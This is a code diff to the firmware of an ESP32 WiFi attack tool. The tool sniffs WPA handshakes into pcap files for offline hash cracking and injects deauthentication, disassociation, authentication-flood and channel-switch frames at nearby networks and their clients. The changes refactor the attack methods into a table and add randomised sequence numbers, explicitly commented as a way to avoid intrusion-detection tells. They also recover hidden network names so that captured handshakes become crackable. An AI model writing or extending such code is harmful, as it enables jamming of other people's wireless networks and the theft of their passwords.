@@ -5,12 +5,14 @@
 #include "pcap.h"
 #include "hc22000.h"
 #include "capture_name.h"
+#include "methods/method_ctx.h"
 #include "../storage/littlefs_ops.h"
 #include "../net/ap_sta.h"
 #include "../core/config.h"
 #include "../core/xp.h"
 #include "../core/wsl_bypasser.h"
 #include <esp_wifi.h>
+#include <esp_random.h>
 #include <WiFi.h>
 #include <SD.h>
 #include <string.h>
@@ -23,7 +25,6 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
 namespace Cap {
 
 static const uint16_t FRAME_MAX = 512;
-static const uint16_t BEACON_MAX = 400;
 static const uint8_t  RING_SLOTS = 12;
 static const uint32_t MAX_FILE_SIZE = 50 * 1024;
 static const uint16_t MAX_FILES = 200;
@@ -52,17 +53,21 @@ static uint32_t s_fileSize = 0;
 static char     s_fileName[Storage::FILE_NAME_MAX];
 static const char* const PREFIX = "/0N3P0rK/handshakes/";
 
+// A beacon captured while a network is still hidden has an empty SSID, so the
+// pcap gets created as HIDDEN_<bssid>.pcap and — worse — Hc22000::convertPcap()
+// can never derive a crackable hash from it later (WPA-PSK needs the real
+// ESSID). When the real name shows up on a later beacon/probe response for a
+// BSSID we already have a HIDDEN file for, we rename the file and splice the
+// revealing frame in. The actual SD I/O happens in drainRing() (loop context),
+// never here — storeBeacon() runs from the WiFi promiscuous callback and must
+// stay allocation/I/O free.
+static uint8_t  s_pendingLearnBssid[6] = {};
+static bool     s_pendingLearn = false;
+
 static const uint8_t BEACON_SLOTS = 16;
-struct BeaconSlot {
-    uint8_t  bssid[6];
-    uint8_t  channel;
-    int8_t   rssi;
-    uint16_t len;
-    char     ssid[33];
-    uint8_t  clients[4][6];
-    uint8_t  clientN;
-    uint8_t  frame[BEACON_MAX];
-};
+// BeaconSlot itself now lives in methods/beacon_slot.h (pulled in via
+// method_ctx.h) so the capture methods can read it without depending on
+// sniffer.cpp's internals.
 static BeaconSlot s_beacons[BEACON_SLOTS];
 static uint8_t s_beaconCount = 0;
 static uint8_t s_beaconClock = 0;
@@ -98,8 +103,6 @@ static uint8_t  s_deauthReason = 7;
 static bool     s_fatPcap = true;
 static uint32_t s_methodStartMs = 0;
 static uint16_t s_pairAtSwitch = 0;
-static uint8_t  s_probeIdx = 0;
-static uint32_t s_lastProbeMs = 0;
 static bool     s_pinOk = false;
 static uint8_t  s_pinBssid[6] = {};
 static uint8_t  s_pinCh = 6;
@@ -114,6 +117,35 @@ static const uint8_t* hopTable(uint8_t* count) {
     return HOP_ALL;
 }
 
+// RSN IE layout: version(2) group(4) pairCnt(2) pair*4 akmCnt(2) akm*4 caps(2) ...
+// bit6 of caps = MFPC (station/AP supports 802.11w), bit7 = MFPR (required).
+// Either bit set means unauthenticated deauth/disassoc will be dropped by the AP/STA.
+static bool parseRsnMfpc(const uint8_t* ie, uint8_t ielen) {
+    if (ielen < 20) return false;
+    uint16_t off = 2 + 4;
+    if (off + 2 > ielen) return false;
+    uint16_t pairCnt = (uint16_t)(ie[off] | (ie[off + 1] << 8));
+    off = (uint16_t)(off + 2 + pairCnt * 4);
+    if (off + 2 > ielen) return false;
+    uint16_t akmCnt = (uint16_t)(ie[off] | (ie[off + 1] << 8));
+    off = (uint16_t)(off + 2 + akmCnt * 4);
+    if (off + 2 > ielen) return false;
+    uint16_t caps = (uint16_t)(ie[off] | (ie[off + 1] << 8));
+    return (caps & 0x00C0) != 0; // MFPC or MFPR
+}
+
+static bool beaconHasPmf(const uint8_t* f, uint16_t len) {
+    uint16_t off = 24 + 12; // fixed beacon params
+    while (off + 2 <= len) {
+        uint8_t id = f[off];
+        uint8_t l = f[off + 1];
+        if (off + 2 + l > len) break;
+        if (id == 48 && parseRsnMfpc(f + off + 2, l)) return true;
+        off = (uint16_t)(off + 2 + l);
+    }
+    return false;
+}
+
 static BeaconSlot* findBeacon(const uint8_t* bssid) {
     for (uint8_t i = 0; i < s_beaconCount; i++) {
         if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) return &s_beacons[i];
@@ -121,8 +153,25 @@ static BeaconSlot* findBeacon(const uint8_t* bssid) {
     return nullptr;
 }
 
+// Method dispatch reads from Methods::table() (see methods/method_ctx.h).
+// Adding a capture method = adding a row to METHOD_LIST() in method_ctx.h;
+// the compiler rebuilds the table, this file doesn't need a thing.
+//
+// s_activeMethod is the index into that table; 0 is the default. The AUTO
+// mode rotates through [1..count) after a fallback timeout, see
+// maybeRotateMethod().
+
+static uint8_t s_methodCount = 0;
+
+static const Methods::Entry* methodTable() {
+    return Methods::table(&s_methodCount);
+}
+
 static void setMethodTag() {
-    strncpy(s_cnt.methodTag, s_activeMethod ? "PAN" : "OURS", sizeof(s_cnt.methodTag) - 1);
+    const Methods::Entry* tbl = methodTable();
+    uint8_t idx = s_activeMethod < s_methodCount ? s_activeMethod : 0;
+    const char* n = tbl[idx].name;
+    strncpy(s_cnt.methodTag, n, sizeof(s_cnt.methodTag) - 1);
     s_cnt.methodTag[sizeof(s_cnt.methodTag) - 1] = '\0';
 }
 
@@ -183,9 +232,14 @@ static void storeBeacon(const uint8_t* bssid, const uint8_t* f, uint16_t len, in
             s_beacons[i].len = len;
             s_beacons[i].channel = s_cnt.currentChannel;
             s_beacons[i].rssi = rssi;
+            s_beacons[i].pmfCapable = beaconHasPmf(f, len);
             bool learned = ssid[0] && !s_beacons[i].ssid[0];
             if (ssid[0]) strncpy(s_beacons[i].ssid, ssid, sizeof(s_beacons[i].ssid) - 1);
-            if (learned) Hc22000::feed(f, len);
+            if (learned) {
+                Hc22000::feed(f, len);
+                memcpy(s_pendingLearnBssid, bssid, 6);
+                s_pendingLearn = true;
+            }
             if (ssid[0] && memcmp(bssid, s_lastHsBssid, 6) == 0) {
                 strncpy(s_cnt.lastHsSsid, ssid, sizeof(s_cnt.lastHsSsid) - 1);
                 s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
@@ -208,6 +262,7 @@ static void storeBeacon(const uint8_t* bssid, const uint8_t* f, uint16_t len, in
     s_beacons[idx].len = len;
     s_beacons[idx].channel = s_cnt.currentChannel;
     s_beacons[idx].rssi = rssi;
+    s_beacons[idx].pmfCapable = beaconHasPmf(f, len);
     if (ssid[0]) strncpy(s_beacons[idx].ssid, ssid, sizeof(s_beacons[idx].ssid) - 1);
     if (!hopLocked()) noteNetwork(bssid, s_beacons[idx].ssid, false);
     Hc22000::feed(f, len);
@@ -431,6 +486,56 @@ static void writeFrameToFile(const Slot& s) {
     }
 }
 
+// Runs from loop() context (via drainRing) — safe to do SD I/O here.
+static void processPendingSsidLearn() {
+    if (!s_pendingLearn) return;
+    s_pendingLearn = false;
+
+    uint8_t bssid[6];
+    memcpy(bssid, s_pendingLearnBssid, 6);
+    const BeaconSlot* b = findBeacon(bssid);
+    if (!b || !b->ssid[0]) return;
+
+    char hiddenStem[40], hiddenName[Storage::FILE_NAME_MAX], hiddenPath[80];
+    CapName::buildStem("", bssid, hiddenStem, sizeof(hiddenStem));
+    snprintf(hiddenName, sizeof(hiddenName), "%s.pcap", hiddenStem);
+    snprintf(hiddenPath, sizeof(hiddenPath), "%s%s", PREFIX, hiddenName);
+    if (!SD.exists(hiddenPath)) return; // nothing was ever written under HIDDEN
+
+    // Same file we're actively streaming into — close it before renaming.
+    if (s_fileOpen && sameBssid(s_fileBssid, bssid)) closeFile();
+
+    char newName[Storage::FILE_NAME_MAX], newPath[80];
+    makeFilename(bssid, newName);
+    snprintf(newPath, sizeof(newPath), "%s%s", PREFIX, newName);
+    if (strcmp(hiddenPath, newPath) == 0) return; // name didn't actually change
+    if (SD.exists(newPath)) return;               // don't clobber an existing file
+
+    if (!SD.rename(hiddenPath, newPath)) {
+        Serial.printf("[CAP] rename %s -> %s failed\n", hiddenName, newName);
+        return;
+    }
+    Serial.printf("[CAP] %s -> %s (ssid learned)\n", hiddenName, newName);
+
+    // Splice the SSID-revealing frame into the renamed pcap. Without this,
+    // Hc22000::convertPcap() run later on this file would still see nothing
+    // but the original hidden beacon and could never rebuild a crackable hash.
+    File f = SD.open(newPath, "a");
+    if (!f) return;
+    uint8_t rt[Pcap::RADIOTAP_FAT_LEN];
+    uint8_t rtLen = Pcap::buildRadiotap(rt, b->channel, b->rssi, s_fatPcap);
+    Pcap::PacketHeader ph;
+    uint32_t ts = millis();
+    ph.tsSec   = ts / 1000;
+    ph.tsUsec  = (ts % 1000) * 1000;
+    ph.inclLen = (uint32_t)(rtLen + b->len);
+    ph.origLen = ph.inclLen;
+    f.write((uint8_t*)&ph, sizeof(ph));
+    f.write(rt, rtLen);
+    f.write(b->frame, b->len);
+    f.close();
+}
+
 static void drainRing() {
     while (s_read != s_write) {
         const Slot& s = s_ring[s_read];
@@ -438,6 +543,7 @@ static void drainRing() {
         s_read = (uint8_t)((s_read + 1) % RING_SLOTS);
     }
     if (s_fileOpen) s_file.flush();
+    processPendingSsidLearn();
 }
 
 static bool isOwnAp(const uint8_t* bssid) {
@@ -446,6 +552,31 @@ static bool isOwnAp(const uint8_t* bssid) {
 
 static bool skipPin(const uint8_t* bssid) {
     return s_pinOk && memcmp(bssid, s_pinBssid, 6) != 0;
+}
+
+// Per-BSSID sequence counter for injected mgmt frames. A static seq=0 on every
+// frame is an easy tell for a WIDS/packet capture and some APs rate-limit or
+// drop obviously-replayed sequence numbers; incrementing per destination
+// mimics a real, ongoing 802.11 session.
+struct SeqEntry { uint8_t bssid[6]; uint16_t seq; bool used; };
+static SeqEntry s_seqTable[16];
+
+static uint16_t nextSeq(const uint8_t* bssid) {
+    for (uint8_t i = 0; i < 16; i++) {
+        if (s_seqTable[i].used && memcmp(s_seqTable[i].bssid, bssid, 6) == 0) {
+            s_seqTable[i].seq = (uint16_t)((s_seqTable[i].seq + 1) & 0x0FFF);
+            return s_seqTable[i].seq;
+        }
+    }
+    for (uint8_t i = 0; i < 16; i++) {
+        if (!s_seqTable[i].used) {
+            memcpy(s_seqTable[i].bssid, bssid, 6);
+            s_seqTable[i].seq = (uint16_t)(esp_random() & 0x0FFF);
+            s_seqTable[i].used = true;
+            return s_seqTable[i].seq;
+        }
+    }
+    return (uint16_t)(esp_random() & 0x0FFF);
 }
 
 static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid, const uint8_t* dest) {
@@ -461,126 +592,45 @@ static void sendRawMgmt(uint8_t fc0, const uint8_t* bssid, const uint8_t* dest) 
     memcpy(pkt + 4, dest, 6);
     memcpy(pkt + 10, bssid, 6);
     memcpy(pkt + 16, bssid, 6);
+    uint16_t seq = nextSeq(bssid);
+    pkt[22] = (uint8_t)((seq << 4) & 0xF0);
+    pkt[23] = (uint8_t)((seq >> 4) & 0xFF);
     pkt[24] = s_deauthReason;
     esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
     if (e != ESP_OK) e = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
     if (e == ESP_OK) s_cnt.framesDeauth++;
 }
 
-static uint8_t csaDisrupt(uint8_t apCh) {
-    if (apCh <= 4) return 11;
-    if (apCh >= 9) return 1;
-    return (apCh <= 6) ? 13 : 1;
-}
-
-static void kickOurs() {
-    uint8_t ch = s_cnt.currentChannel;
-    uint8_t rounds = s_kickBurst ? s_kickBurst : 1;
-    for (uint8_t i = 0; i < s_beaconCount; i++) {
-        const uint8_t* bssid = s_beacons[i].bssid;
-        if (s_beacons[i].channel != ch) continue;
-        if (isOwnAp(bssid)) continue;
-        if (skipPin(bssid)) continue;
-        if (s_beacons[i].rssi < s_minRssi) continue;
-        for (uint8_t r = 0; r < rounds; r++) {
-            sendRawMgmt(0xC0, bssid, s_bcast);
-            sendRawMgmt(0xA0, bssid, s_bcast);
-        }
-        if (s_kickStaOk && memcmp(s_kickBssid, bssid, 6) == 0) {
-            sendRawMgmt(0xC0, bssid, s_kickSta);
-            sendRawMgmt(0xA0, bssid, s_kickSta);
-        }
-        yield();
-    }
-}
-
-static void kickPan() {
-    uint8_t ch = s_cnt.currentChannel;
-    uint8_t rounds = s_kickBurst ? s_kickBurst : 1;
-    uint8_t hit = 0;
-    const BeaconSlot* csaTarget = nullptr;
-    for (uint8_t i = 0; i < s_beaconCount; i++) {
-        BeaconSlot& b = s_beacons[i];
-        if (b.channel != ch) continue;
-        if (isOwnAp(b.bssid)) continue;
-        if (skipPin(b.bssid)) continue;
-        if (b.rssi < s_minRssi) continue;
-        if (Hc22000::hasPair(b.bssid)) continue;
-
-        if (b.clientN) {
-            for (uint8_t c = 0; c < b.clientN; c++) {
-                if (s_bidirKick) {
-                    WSLBypasser::sendBidirectionalKick(b.bssid, b.clients[c], s_deauthReason, rounds);
-                    s_cnt.framesDeauth = (uint32_t)(s_cnt.framesDeauth + (uint32_t)rounds * 4);
-                } else {
-                    for (uint8_t r = 0; r < rounds; r++) {
-                        sendRawMgmt(0xC0, b.bssid, b.clients[c]);
-                        sendRawMgmt(0xA0, b.bssid, b.clients[c]);
-                    }
-                }
-                if (s_eapolTx) {
-                    WSLBypasser::sendEAPOLStart(b.bssid, b.clients[c]);
-                    WSLBypasser::sendEAPOLLogoff(b.bssid, b.clients[c]);
-                }
-                hit++;
-            }
-        } else {
-            for (uint8_t r = 0; r < rounds; r++) {
-                sendRawMgmt(0xC0, b.bssid, s_bcast);
-                sendRawMgmt(0xA0, b.bssid, s_bcast);
-            }
-        }
-        if (!csaTarget) csaTarget = &b;
-        yield();
-    }
-
-    if (!hit && s_authFlood) {
-        for (uint8_t i = 0; i < s_beaconCount; i++) {
-            BeaconSlot& b = s_beacons[i];
-            if (b.channel != ch) continue;
-            if (isOwnAp(b.bssid)) continue;
-            if (skipPin(b.bssid)) continue;
-            if (b.rssi < s_minRssi) continue;
-            if (Hc22000::hasPair(b.bssid)) continue;
-            WSLBypasser::sendAuthFlood(b.bssid, 8);
-            s_cnt.framesDeauth += 8;
-            break;
-        }
-    }
-
-    if (s_csaHerd && csaTarget && csaTarget->ssid[0]) {
-        WSLBypasser::sendCSABeacon(csaTarget->bssid, csaTarget->ssid,
-                                   csaTarget->channel, csaDisrupt(csaTarget->channel), 1);
-    }
-}
-
-static void pmkidOnThisChannel() {
-    if (!s_pmkidProbe) return;
-    uint32_t now = millis();
-    if (now - s_lastProbeMs < 1500) return;
-    uint8_t ch = s_cnt.currentChannel;
-    uint8_t n = s_beaconCount;
-    if (!n) return;
-    for (uint8_t k = 0; k < n; k++) {
-        s_probeIdx = (uint8_t)((s_probeIdx + 1) % n);
-        BeaconSlot& b = s_beacons[s_probeIdx];
-        if (b.channel != ch) continue;
-        if (isOwnAp(b.bssid)) continue;
-        if (skipPin(b.bssid)) continue;
-        if (b.rssi < s_minRssi) continue;
-        if (!b.ssid[0]) continue;
-        if (Hc22000::hasPair(b.bssid)) continue;
-        WSLBypasser::sendAuthentication(b.bssid);
-        WSLBypasser::sendAssociationRequest(b.bssid, b.ssid);
-        s_lastProbeMs = now;
-        s_cnt.framesDeauth++;
-        return;
-    }
+static Methods::Ctx buildMethodCtx() {
+    Methods::Ctx ctx{};
+    ctx.beacons      = s_beacons;
+    ctx.beaconCount   = s_beaconCount;
+    ctx.channel       = s_cnt.currentChannel;
+    ctx.minRssi       = s_minRssi;
+    ctx.kickBurst     = s_kickBurst;
+    ctx.deauthReason  = s_deauthReason;
+    ctx.bidirKick     = s_bidirKick;
+    ctx.eapolTx       = s_eapolTx;
+    ctx.pmkidProbe    = s_pmkidProbe;
+    ctx.csaHerd       = s_csaHerd;
+    ctx.authFlood     = s_authFlood;
+    ctx.kickBssid     = s_kickBssid;
+    ctx.kickSta       = s_kickSta;
+    ctx.kickStaOk     = s_kickStaOk;
+    ctx.bcast         = s_bcast;
+    ctx.isOwnAp       = isOwnAp;
+    ctx.skipPin       = skipPin;
+    ctx.sendRawMgmt   = sendRawMgmt;
+    ctx.framesDeauth  = &s_cnt.framesDeauth;
+    return ctx;
 }
 
 static void kickOnThisChannel() {
     if (!s_deauthEnabled) return;
     if (Hc22000::shouldPauseDeauth()) return;
+    const Methods::Entry* tbl = methodTable();
+    uint8_t idx = s_activeMethod < s_methodCount ? s_activeMethod : 0;
+    const Methods::Entry& m = tbl[idx];
     if (s_pinOk) {
         bool seen = false;
         for (uint8_t i = 0; i < s_beaconCount; i++) {
@@ -592,20 +642,21 @@ static void kickOnThisChannel() {
                 sendRawMgmt(0xC0, s_pinBssid, s_bcast);
                 sendRawMgmt(0xA0, s_pinBssid, s_bcast);
             }
-            if (s_activeMethod == 1 && s_pmkidProbe && s_pinSsid[0] &&
+            if (m.probe && s_pmkidProbe && s_pinSsid[0] &&
                 !Hc22000::hasPair(s_pinBssid)) {
                 WSLBypasser::sendAuthentication(s_pinBssid);
                 WSLBypasser::sendAssociationRequest(s_pinBssid, s_pinSsid);
             }
         }
     }
-    if (s_activeMethod == 1) kickPan();
-    else kickOurs();
-    if (s_activeMethod == 1) pmkidOnThisChannel();
+    Methods::Ctx ctx = buildMethodCtx();
+    m.kick(ctx);
+    if (m.probe) m.probe(ctx);
 }
 
 static void maybeRotateMethod() {
     if (s_hsMethod != (uint8_t)HsMethod::AUTO) return;
+    if (s_methodCount < 2) return; // nothing to rotate through
     uint16_t pairs = Hc22000::pairCount();
     if (pairs > s_pairAtSwitch) {
         s_pairAtSwitch = pairs;
@@ -615,7 +666,9 @@ static void maybeRotateMethod() {
     uint32_t waitMs = (uint32_t)s_fallbackSec * 1000u;
     if (waitMs < 10000) waitMs = 10000;
     if (millis() - s_methodStartMs < waitMs) return;
-    s_activeMethod = s_activeMethod ? 0 : 1;
+    // Round-robin through every method in the table. The first entry is
+    // the AUTO default; every other entry gets a turn after fallbackSec.
+    s_activeMethod = (uint8_t)((s_activeMethod + 1) % s_methodCount);
     s_methodStartMs = millis();
     s_pairAtSwitch = pairs;
     setMethodTag();
@@ -645,6 +698,8 @@ static void startCommon(RunMode mode) {
     s_write = 0;
     s_read = 0;
     s_cnt = {};
+    memset(s_seqTable, 0, sizeof(s_seqTable));
+    s_pendingLearn = false;
     s_cnt.currentBssid[0] = 0;
     s_cnt.currentSsid[0] = 0;
     s_cnt.lastHsSsid[0] = 0;
@@ -676,11 +731,30 @@ static void startCommon(RunMode mode) {
     s_authFlood = Config::radio().authFlood;
     s_deauthReason = Config::radio().deauthReason;
     s_fatPcap = Config::radio().fatPcap;
-    if (s_hsMethod == (uint8_t)HsMethod::PAN) s_activeMethod = 1;
-    else s_activeMethod = 0;
+    // AUTO starts on table index 0 and rotates via maybeRotateMethod().
+    // Explicit non-AUTO values resolve to the table row with the same name;
+    // unknown names (e.g. legacy NVS value) fall back to 0 so the device
+    // still boots instead of getting stuck on an out-of-range index.
+    if (s_methodCount == 0) methodTable(); // populate s_methodCount
+    if ((HsMethod)s_hsMethod == HsMethod::AUTO) {
+        s_activeMethod = 0;
+    } else {
+        const char* want = nullptr;
+        switch ((HsMethod)s_hsMethod) {
+            case HsMethod::OURS: want = "OURS"; break;
+            case HsMethod::PAN:  want = "PAN";  break;
+            default: break;
+        }
+        s_activeMethod = 0;
+        if (want) {
+            for (uint8_t i = 0; i < s_methodCount; i++) {
+                if (strcmp(methodTable()[i].name, want) == 0) { s_activeMethod = i; break; }
+            }
+        }
+    }
     s_methodStartMs = millis();
     s_pairAtSwitch = Hc22000::pairCount();
-    s_lastProbeMs = 0;
+    Methods::resetAll();
     setMethodTag();
     if (s_hopMs < 50) s_hopMs = 50;
 
